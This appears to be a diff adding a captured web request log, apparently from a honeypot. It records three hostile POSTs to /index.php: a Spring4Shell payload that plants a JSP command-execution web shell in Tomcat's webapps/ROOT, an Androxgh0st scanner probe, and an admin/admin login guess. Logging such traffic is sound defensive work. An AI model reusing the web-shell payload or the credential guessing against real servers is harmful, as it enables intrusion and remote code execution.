@@ -1,0 +1,30 @@
+104.156.155.29 : curl/7.54.0
+COOKIE : 
+POST_/index.php
+array (
+  'class_module_classLoader_resources_context_parent_pipeline_first_pattern' => '%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
+  'class_module_classLoader_resources_context_parent_pipeline_first_suffix' => '.jsp',
+  'class_module_classLoader_resources_context_parent_pipeline_first_directory' => 'webapps/ROOT',
+  'class_module_classLoader_resources_context_parent_pipeline_first_prefix' => 'tomcatwar',
+  'class_module_classLoader_resources_context_parent_pipeline_first_fileDateFormat' => '',
+)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+85.202.169.142 : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
+COOKIE : 
+POST_/index.php
+array (
+  '0x' => 
+  array (
+    0 => 'androxgh0st',
+  ),
+)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+188.0.188.19 : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.160 YaBrowser/22.5.2.615 Yowser/2.5 Safari/537.36
+COOKIE : PHPSESSID=infi14vcu1h4tvr336gbgq0s96
+POST_/index.php
+array (
+  'uin' => 'CHR_GRC',
+  'login' => 'admin',
+  'pass' => 'admin',
+)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
